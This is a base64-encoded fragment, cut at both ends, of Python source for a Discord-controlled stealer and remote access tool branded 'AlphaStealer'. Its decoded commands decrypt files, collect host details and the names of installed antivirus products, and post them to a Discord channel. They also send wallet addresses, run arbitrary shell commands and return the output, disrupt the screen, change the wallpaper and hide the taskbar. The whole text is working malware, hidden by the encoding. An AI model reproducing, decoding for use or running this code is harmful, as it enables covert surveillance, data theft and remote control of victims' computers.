WxlcGF0aF0NCiAgICBlbHNlOg0KICAgICAgICByZXR1cm4NCg0KICAgIGtleSA9IGNhcmdhcl9rZXkoKQ0KDQogICAgZGVjcnlwdChmdWxsX3BhdGhzLCBrZXkpDQoNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdBbGwgZmlsZXMgZGVjcnlwZWQuJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCg0KZGVmIG9idGVuZXJfYmlvc19pbmZvKCk6DQogICAgdHJ5Og0KICAgICAgICB3bWkgPSB3aW4zMmNvbS5jbGllbnQuRGlzcGF0Y2goIldiZW1TY3JpcHRpbmcuU1diZW1Mb2NhdG9yIikNCiAgICAgICAgY29uZXhpb24gPSB3bWkuQ29ubmVjdFNlcnZlcigiLiIsICJyb290XFxjaW12MiIpDQogICAgICAgIA0KICAgICAgICBiaW9zX2luZm8gPSBjb25leGlvbi5FeGVjUXVlcnkoIlNFTEVDVCAqIEZST00gV2luMzJfQklPUyIpDQogICAgICAgIA0KICAgICAgICBmb3IgYmlvcyBpbiBiaW9zX2luZm86DQogICAgICAgICAgICBub21icmVfYmlvcyA9IGJpb3MuTmFtZQ0KICAgICAgICAgICAgdmVyc2lvbl9iaW9zID0gYmlvcy5WZXJzaW9uDQogICAgICAgICAgICByZXR1cm4gbm9tYnJlX2Jpb3MsIHZlcnNpb25fYmlvcw0KICAgICAgICANCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHJldHVybiAnTm9uZScNCg0KZGVmIGdldF9pbmZvX21iKCk6DQogICAgdHJ5Og0KICAgICAgICB3bWkgPSB3aW4zMmNvbS5jbGllbnQuRGlzcGF0Y2goIldiZW1TY3JpcHRpbmcuU1diZW1Mb2NhdG9yIikNCiAgICAgICAgY29uZXhpb24gPSB3bWkuQ29ubmVjdFNlcnZlcigiLiIsICJyb290XFxjaW12MiIpDQogICAgICAgIA0KICAgICAgICBwbGFjYV9iYXNlX2luZm8gPSBjb25leGlvbi5FeGVjUXVlcnkoIlNFTEVDVCAqIEZST00gV2luMzJfQmFzZUJvYXJkIikNCiAgICAgICAgDQogICAgICAgIGZvciBwbGFjYSBpbiBwbGFjYV9iYXNlX2luZm86DQogICAgICAgICAgICBub21icmVfcGxhY2EgPSBwbGFjYS5Qcm9kdWN0DQogICAgICAgICAgICBtb2RlbG9fcGxhY2EgPSBwbGFjYS5Qcm9kdWN0DQogICAgICAgIA0KICAgICAgICByZXR1cm4gew0KICAgICAgICAgICAgIk5hbWUiOiBub21icmVfcGxhY2EsDQogICAgICAgICAgICAiTW9kZWwiOiBtb2RlbG9fcGxhY2ENCiAgICAgICAgfQ0KICAgIA0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcmV0dXJuIGYnTm9uZScNCg0KZGVmIG9idGVuZXJfZGlyZWNjaW9uX21hYygpOg0KICAgIGludGVyZmFjZXMgPSBwc3V0aWwubmV0X2lmX2FkZHJzKCkNCg0KICAgIGZvciBpbnRlcmZheiwgZGlyZWNjaW9uZXMgaW4gaW50ZXJmYWNlcy5pdGVtcygpOg0KICAgICAgICBmb3IgZGlyZWNjaW9uIGluIGRpcmVjY2lvbmVzOg0KICAgICAgICAgICAgaWYgZGlyZWNjaW9uLmZhbWlseSA9PSBwc3V0aWwuQUZfTElOSzoNCiAgICAgICAgICAgICAgICByZXR1cm4gZiJ7ZGlyZWNjaW9uLmFkZHJlc3N9Ig0KDQogICAgcmV0dXJuICdOb25lJw0KDQpOYW1lQklPUywgVmVyc2lvbkJJT1MgPSBvYnRlbmVyX2Jpb3NfaW5mbygpDQpwbGFjYV9iYXNlID0gZ2V0X2luZm9fbWIoKQ0KTWFjQWRkcmVzcyA9IG9idGVuZXJfZGlyZWNjaW9uX21hYygpDQoNCkBib3QuY29tbWFuZChuYW1lPSdzeXNpbmZvJykNCmFzeW5jIGRlZiBTeXNJbmZvKGN0eCk6DQogICAgYW50aXZpcnVzX2xpc3QgPSBbXQ0KICAgIHRyeToNCiAgICAgICAgcmVnX3BhdGggPSByIlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCINCiAgICAgICAgd2l0aCB3aW5yZWcuT3BlbktleSh3aW5yZWcuSEtFWV9MT0NBTF9NQUNISU5FLCByZWdfcGF0aCkgYXMga2V5Og0KICAgICAgICAgICAgaSA9IDANCiAgICAgICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBzdWJfa2V5X25hbWUgPSB3aW5yZWcuRW51bUtleShrZXksIGkpDQogICAgICAgICAgICAgICAgICAgIHdpdGggd2lucmVnLk9wZW5LZXkod2lucmVnLkhLRVlfTE9DQUxfTUFDSElORSwgcmVnX3BhdGggKyAnXFwnICsgc3ViX2tleV9uYW1lKSBhcyBzdWJfa2V5Og0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlfbmFtZSwgXyA9IHdpbnJlZy5RdWVyeVZhbHVlRXgoc3ViX2tleSwgIkRpc3BsYXlOYW1lIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5X3BhdGgsIF8gPSB3aW5yZWcuUXVlcnlWYWx1ZUV4KHN1Yl9rZXksICJJbnN0YWxsTG9jYXRpb24iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdhbnRpdmlydXMnIGluIGRpc3BsYXlfbmFtZS5sb3dlcigpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhbnRpdmlydXNfbGlzdC5hcHBlbmQoZiJ7ZGlzcGxheV9uYW1lfSB8IHtkaXNwbGF5X3BhdGh9IikNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICAgICAgICAgIGkgKz0gMQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBPU0Vycm9yOg0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcGFzcw0KDQogICAgSXBDb21wdXRlciA9IHNvY2tldC5nZXRob3N0YnluYW1lKGhvc3RuYW1lKQ0KICAgIHN5c3RlbV9uYW1lID0gcGxhdGZvcm0uc3lzdGVtKCkNCiAgICByZWxlYXNlID0gcGxhdGZvcm0ucmVsZWFzZSgpDQogICAgdmVyc2lvbiA9IHBsYXRmb3JtLnZlcnNpb24oKQ0KICAgIGFyY2hpdGVjdHVyZSA9IHBsYXRmb3JtLmFyY2hpdGVjdHVyZSgpWzBdDQogICAgaXNfd2luZG93c19wZSA9ICJXaW5kb3dzUEUiIGlmIG9zLnBhdGguZXhpc3RzKHIiQzpcV2luZG93c1xTeXN0ZW0zMlx3aW5wZXNobC5pbmkiKSBlbHNlICJOb3JtYWwgV2luZG93cyINCiAgICBDcHUgPSBwbGF0Zm9ybS5wcm9jZXNzb3IoKQ0KICAgIHRvdGFsX21lbW9yeSA9IHBzdXRpbC52aXJ0dWFsX21lbW9yeSgpLnRvdGFsDQogICAgdG90YWxfbWVtb3J5X2diID0gdG90YWxfbWVtb3J5IC8gKDEwMjQgKiogMykNCiAgICBncHUgPSBHUFV0aWwuZ2V0R1BVcygpWzBdDQogICAgQ3B1cyA9IG9zLmNwdV9jb3VudCgpDQogICAgQ3B1VXNhZ2UgPSBwc3V0aWwuY3B1X3BlcmNlbnQoaW50ZXJ2YWw9MSkNCiAgICBzeXN0ZW0gPSBmIntzeXN0ZW1fbmFtZX0ge3JlbGVhc2V9LCB7dmVyc2lvbn0gKCd7YXJjaGl0ZWN0dXJlfScsICd7aXNfd2luZG93c19wZX0nKSINCg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT1mJ/Cfkokg8J2VrPCdlpHwnZaV8J2WjfCdlobwnZW+8J2WmfCdlorwnZaG8J2WkfCdlorwnZaXIC0ge3VzZXJuYW1lfSDwn5KJJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9Jzw6RGNIOjEzNjU5NTY2MTk3ODcxNzgwMDQ+IElQJywgdmFsdWU9ZidgYGB7SXBDb21wdXRlcn1gYGAnKQ0KICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSc8Ok1lbWJlcjoxMzY2MTQ3NjI4OTQ5MzExNTAxPiBQQyBVU0VSJywgdmFsdWU9ZidgYGB7dXNlcm5hbWV9YGBgJykNCiAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0nPGE6bGFwdG9wOjEzNjYxNDgyMDYxNjA5MDgzNTg+IFBDIE5BTUUnLCB2YWx1ZT1mJ2BgYHtob3N0bmFtZX1gYGAnKQ0KICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSc8OlBDOjEzNjYxNDgyMjQyODQ0OTE3OTE+IFNZU1RFTScsIHZhbHVlPWYnYGBge3N5c3RlbX1gYGAnKQ0KICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSc8OkludGVsX0NvcmVfaTk6MTM2NjE0OTc5OTM0MTk4MTcwNj4gQ1BVIE5BTUUnLCB2YWx1ZT1mJ2BgYHtDcHV9YGBgJykNCiAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0nPDpSYW06MTM2NjE1MDIzMDk1NjgzOTA1ND4gUkFNIFRPVEFMJywgdmFsdWU9ZidgYGB7dG90YWxfbWVtb3J5X2diOi4yZn1HQmBgYCcpDQogICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9Jzw6TnZpZGlhXzMwOTBfR1BVOjEzNjY0MTc5Njk0MDc1OTQ1MDY+IEdSQVBISUNTIENBUkQnLCB2YWx1ZT1mJ2BgYHtncHUubmFtZX1gYGAnKQ0KICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSfwn4+tIENQVSBDT1JFUycsIHZhbHVlPWYnYGBge0NwdXN9YGBgJykNCiAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0nPDp3aW5kb3dzX2htbV9ibHVlc2NyZWVuOjEzNjY0MTk0ODAzODkwOTE0MTk+IFNDUkVFTiBSRVNPTFVUSU9OJywgdmFsdWU9ZidgYGB7cmVzb2x1Y2lvblswXX14e3Jlc29sdWNpb25bMV19YGBgJykNCiAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0nPDpOQV9Sb2NrZXQ6MTM2NjQxOTkwOTM0MDU2NTU3NT4gQ1BVIFVTQUdFJywgdmFsdWU9ZidgYGB7Q3B1VXNhZ2V9JWBgYCcpDQogICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9J/Cfk58gQklPUyBOQU1FJywgdmFsdWU9ZidgYGB7TmFtZUJJT1N9YGBgJykNCiAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0n8J+UkSBCSU9TIFZFUlNJT04nLCB2YWx1ZT1mJ2BgYHtWZXJzaW9uQklPU31gYGAnKQ0KICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSfwn6ewIE1CIE1PREVMJywgdmFsdWU9ZidgYGB7cGxhY2FfYmFzZVsiTW9kZWwiXX1gYGAnKQ0KICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSc8OkV1cm9wZWFuQnVpbGRpbmdzOjEzNjY0MjMzMjI3NDg3ODA2Nzc+IE1CIE5BTUUnLCB2YWx1ZT1mJ2BgYHtwbGFjYV9iYXNlWyJOYW1lIl19YGBgJykNCiAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0nPDphcHBsZXByaXZhY3k6MTM2NjQyMzg1NjIzOTIxODc4OT4gTUFDIEFERFJFU1MnLCB2YWx1ZT1mJ2BgYHtNYWNBZGRyZXNzfWBgYCcpDQoNCiAgICBpZiBub3QgYW50aXZpcnVzX2xpc3Q6DQogICAgICAgIHBhc3MNCiAgICBlbHNlOg0KICAgICAgICBmb3IgYW50aXZpcnVzIGluIGFudGl2aXJ1c19saXN0Og0KICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9IkFudGl2aXJ1cyBGb3VuZDoiLCB2YWx1ZT1mJ2BgYHthbnRpdmlydXN9YGBgJywgaW5saW5lPUZhbHNlKQ0KDQogICAgaW5mb19jaGFubmVsID0gTm9uZQ0KICAgIGZvciBjaGFubmVsIGluIGN0eC5jaGFubmVsLmNhdGVnb3J5LmNoYW5uZWxzOg0KICAgICAgICBpZiBjaGFubmVsLm5hbWUgPT0gImluZm8iOg0KICAgICAgICAgICAgaW5mb19jaGFubmVsID0gY2hhbm5lbA0KICAgICAgICAgICAgYnJlYWsNCg0KICAgIGlmIGluZm9fY2hhbm5lbDoNCiAgICAgICAgYXdhaXQgaW5mb19jaGFubmVsLnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCkBib3QuY29tbWFuZChuYW1lPSdhZG1pbmNoZWNrJykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYgYWRtaW5jaGVjayhjdHgpOg0KICAgIGlmIGlzX2FkbWluKCk6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1RoZSBBbHBoYVN0ZWFsZXIgaGFzIGFkbWluaXN0cmF0b3IgcHJpdmlsZWdlcy4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgZWxzZToNCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nVGhlIEFscGhhU3RlYWxlciBkb2VzIG5vdCBoYXZlIGFkbWluaXN0cmF0b3IgcHJpdmlsZWdlcy4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCkBib3QuY29tbWFuZChuYW1lPSd3YWxsZXRzJykNCmFzeW5jIGRlZiB3YWxsZXRzKGN0eCk6DQogICAgdHJ5Og0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdXYWxsZXRzIFNlbnQuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQogICAgICAgIGlmIGdldGF0dHIoc3lzLCAnZnJvemVuJywgRmFsc2UpOg0KICAgICAgICAgICAgbm93X3BhdGggPSBvcy5wYXRoLmRpcm5hbWUoc3lzLmV4ZWN1dGFibGUpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBub3dfcGF0aCA9IG9zLnBhdGguZGlybmFtZShvcy5wYXRoLmFic3BhdGgoX19maWxlX18pKQ0KDQogICAgICAgIGNvbmZpZ19wYXRoID0gb3MucGF0aC5qb2luKG5vd19wYXRoLCAnbGliJywgJ2NyeXB0by5qc29uJykNCg0KICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoY29uZmlnX3BhdGgpOg0KICAgICAgICAgICAgcmV0dXJuDQoNCiAgICAgICAgd2l0aCBvcGVuKGNvbmZpZ19wYXRoLCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6DQogICAgICAgICAgICBhZGRyZXNzZXMgPSBqc29uLmxvYWQoZikNCg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9IldhbGxldHMgcmVnaXN0cmFkYXMiLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCg0KICAgICAgICBpbmZvX2NoYW5uZWwgPSBOb25lDQogICAgICAgIGlmIGN0eC5jaGFubmVsLmNhdGVnb3J5Og0KICAgICAgICAgICAgZm9yIGNoYW5uZWwgaW4gY3R4LmNoYW5uZWwuY2F0ZWdvcnkuY2hhbm5lbHM6DQogICAgICAgICAgICAgICAgaWYgY2hhbm5lbC5uYW1lLmxvd2VyKCkgPT0gImluZm8iOg0KICAgICAgICAgICAgICAgICAgICBpbmZvX2NoYW5uZWwgPSBjaGFubmVsDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQoNCiAgICAgICAgaWYgaW5mb19jaGFubmVsIGlzIE5vbmU6DQogICAgICAgICAgICByZXR1cm4NCg0KICAgICAgICBpZiBhZGRyZXNzZXM6DQogICAgICAgICAgICBmb3IgY3VycmVuY3ksIGFkZHJlc3MgaW4gYWRkcmVzc2VzLml0ZW1zKCk6DQogICAgICAgICAgICAgICAgdmFsdWUgPSBhZGRyZXNzIGlmIGFkZHJlc3MgZWxzZSAnTm8nDQogICAgICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9Y3VycmVuY3kudXBwZXIoKSwgdmFsdWU9ZidgYGB7dmFsdWV9YGBgJywgaW5saW5lPUZhbHNlKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgZW1iZWQuZGVzY3JpcHRpb24gPSAiTm8gaGF5IHdhbGxldHMgcmVnaXN0cmFkYXMuIg0KDQogICAgICAgIGF3YWl0IGluZm9fY2hhbm5lbC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwYXNzDQoNCmRlZiBhcGFnYXJfcGFudGFsbGEoKToNCiAgICBjdHlwZXMud2luZGxsLnVzZXIzMi5TZW5kTWVzc2FnZVcoMHhGRkZGLCAweDExMiwgMHhGMTcwLCAyKQ0KDQpkZWYgZW5jZW5kZXJfcGFudGFsbGEoKToNCiAgICBweWF1dG9ndWkucHJlc3MoJ3NoaWZ0JykNCg0KZGVmIGNpY2xvX2FwYWdhcl9lbmNlbmRlcih0aWVtcG9fc2VndW5kb3MpOg0KICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQ0KICAgIHdoaWxlIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA8IHRpZW1wb19zZWd1bmRvczoNCiAgICAgICAgYXBhZ2FyX3BhbnRhbGxhKCkNCiAgICAgICAgdGltZS5zbGVlcCgwLjUpDQogICAgICAgIGVuY2VuZGVyX3BhbnRhbGxhKCkNCiAgICAgICAgdGltZS5zbGVlcCgwLjUpDQoNCmRlZiBTdGFydFNjcmVlblRyb2xsKHRpZW1wb19zZWd1bmRvcyk6DQogICAgY2ljbG9fYXBhZ2FyX2VuY2VuZGVyKHRpZW1wb19zZWd1bmRvcykNCg0KZGVmIEJ1Y2xlU2NyZWVPZmYoKToNCiAgICBnbG9iYWwgU2NyZWVuDQogICAgd2hpbGUgU2NyZWVuOg0KICAgICAgICBhcGFnYXJfcGFudGFsbGEoKQ0KDQpkZWYgU3RhcnRTY3JlZW5PZmYoKToNCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1CdWNsZVNjcmVlT2ZmLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nc2NyZWVudHJvbGwnKQ0KYXN5bmMgZGVmIFNjcmVlblRyb2xsKGN0eCwgdGllbXBvX3NlZ3VuZG9zOiBpbnQpOg0KICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVN0YXJ0U2NyZWVuVHJvbGwsIGFyZ3M9KHRpZW1wb19zZWd1bmRvcywpLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQ0KDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nU2NyZWVuIFRyb2xsIFN0YXJ0ZWQuJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3NjcmVlbm9mZicpDQphc3luYyBkZWYgU2NyZWVuT2ZmKGN0eCk6DQogICAgZ2xvYmFsIFNjcmVlbg0KICAgIFNjcmVlbiA9IFRydWUNCiAgICBTdGFydFNjcmVlbk9mZigpDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nU2NyZWVuIE9mZi4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nc2NyZWVub24nKQ0KYXN5bmMgZGVmIFNjcmVlbk9uKGN0eCk6DQogICAgZ2xvYmFsIFNjcmVlbg0KICAgIFNjcmVlbiA9IEZhbHNlDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nU2NyZWVuIE9uLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCnZhbGlkX2V4dGVuc2lvbnMgPSBbJy5wbmcnLCAnLmpwZycsICcuanBlZycsICcuaWNvJywgJy5qZmlmJ10NCg0KQGJvdC5jb21tYW5kKG5hbWU9J3dhbGxwYXBlcicpDQphc3luYyBkZWYgd2FsbHBhcGVyKGN0eCk6DQogICAgaWYgbGVuKGN0eC5tZXNzYWdlLmF0dGFjaG1lbnRzKSA9PSAwOg0KICAgICAgICBhd2FpdCBjdHguc2VuZCgiUG9yIGZhdm9yLCBzdWJlIHVuYSBpbWFnZW4gdmFsaWRhLiIpDQogICAgICAgIHJldHVybg0KDQogICAgZmlsZSA9IGN0eC5tZXNzYWdlLmF0dGFjaG1lbnRzWzBdDQogICAgDQogICAgZmlsZV9leHRlbnNpb24gPSBvcy5wYXRoLnNwbGl0ZXh0KGZpbGUuZmlsZW5hbWUpWzFdLmxvd2VyKCkNCg0KICAgIGlmIGZpbGVfZXh0ZW5zaW9uIG5vdCBpbiB2YWxpZF9leHRlbnNpb25zOg0KICAgICAgICBhd2FpdCBjdHguc2VuZCgiRXJyb3IgMzA1IikNCiAgICAgICAgcmV0dXJuDQoNCiAgICBpZiBub3QgZmlsZS5jb250ZW50X3R5cGUuc3RhcnRzd2l0aCgnaW1hZ2UvJyk6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKCJJdCBpcyBub3QgYSB2YWxpZCBpbWFnZS4iKQ0KICAgICAgICByZXR1cm4NCg0KICAgIGFwcGRhdGFfcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydBUFBEQVRBJ10pDQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGFwcGRhdGFfcGF0aCk6DQogICAgICAgIG9zLm1ha2VkaXJzKGFwcGRhdGFfcGF0aCkNCg0KICAgIGltYWdlX3BhdGggPSBvcy5wYXRoLmpvaW4oYXBwZGF0YV9wYXRoLCBmJ3dhbGxwYXBlcntmaWxlX2V4dGVuc2lvbn0nKQ0KDQogICAgdHJ5Og0KICAgICAgICBhd2FpdCBmaWxlLnNhdmUoaW1hZ2VfcGF0aCkNCg0KICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgY3R5cGVzLndpbmRsbC51c2VyMzIuU3lzdGVtUGFyYW1ldGVyc0luZm9XKDIwLCAwLCBpbWFnZV9wYXRoLCAzKQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1dhbGxwYXBlciBjaGFuZ2VkIHN1Y2Nlc3NmdWxseS4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBGYWlsdXJlJywgZGVzY3JpcHRpb249ZiJFcnJvciBhbCBjYW1iaWFyIGVsIGZvbmRvIGRlIHBhbnRhbGxhOiB7ZX0iLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcGFzcw0KDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwYXNzDQogICAgDQogICAgZmluYWxseToNCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoaW1hZ2VfcGF0aCk6DQogICAgICAgICAgICBvcy5yZW1vdmUoaW1hZ2VfcGF0aCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2NtZCcpDQphc3luYyBkZWYgY21kKGN0eCwgKiwgY29tbWFuZDogc3RyKToNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdTZW5kaW5nIE91dHB1dC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIHRyeToNCiAgICAgICAgYXJncyA9IHNobGV4LnNwbGl0KGNvbW1hbmQpDQogICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MucnVuKGFyZ3MsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSwgc2hlbGw9VHJ1ZSkNCiAgICAgICAgd2l0aCBvcGVuKCdvdXRwdXQudHh0JywgJ3cnKSBhcyBmaWxlOg0KICAgICAgICAgICAgaWYgcmVzdWx0LnN0ZG91dDoNCiAgICAgICAgICAgICAgICBmaWxlLndyaXRlKHJlc3VsdC5zdGRvdXQgKyAnXG4nKQ0KICAgICAgICAgICAgaWYgcmVzdWx0LnN0ZGVycjoNCiAgICAgICAgICAgICAgICBmaWxlLndyaXRlKHJlc3VsdC5zdGRlcnIgKyAnXG4nKQ0KICAgICAgICANCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZmlsZT1kaXNjb3JkLkZpbGUoJ291dHB1dC50eHQnKSkNCiAgICAgICAgb3MucmVtb3ZlKCdvdXRwdXQudHh0JykNCg0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZiJIdWJvIHVuIGVycm9yIGFsIGVqZWN1dGFyIGVsIGNvbWFuZG86IHtlfSIpDQoNClNXX1NIT1dOT1JNQUwgPSAxDQpTV19ISURFID0gMA0KDQpkZWYgc2hvd190YXNrYmFyKCk6DQogICAgdXNlcjMyID0gY3R5cGVzLndpbmRsbC51c2VyMzINCiAgICBod25kID0gdXNlcjMyLkZpbmRXaW5kb3dXKE5vbmUsICJTaGVsbF9UcmF5V25kIikNCiAgICBpZiBod25kOg0KICAgICAgICB1c2VyMzIuU2hvd1dpbmRvdyhod25kLCBTV19TSE9XTk9STUFMKQ0KICAgIGVsc2U6DQogICAgICAgIHBhc3MNCg0KZGVmIGhpZGVfdGFza2JhcigpOg0KICAgIHVzZXIzMiA9IGN0eXBlcy53aW5kbGwudXNlcjMyDQogICAgaHduZCA9IHVzZXIzMi5GaW5kV2luZG93VyhOb25lLCAiU2hlbGxfVHJheVduZCIpDQogICAgaWYgaHduZDoNCiAgICAgICAgdXNlcjMyLlNob3dXaW5kb3coa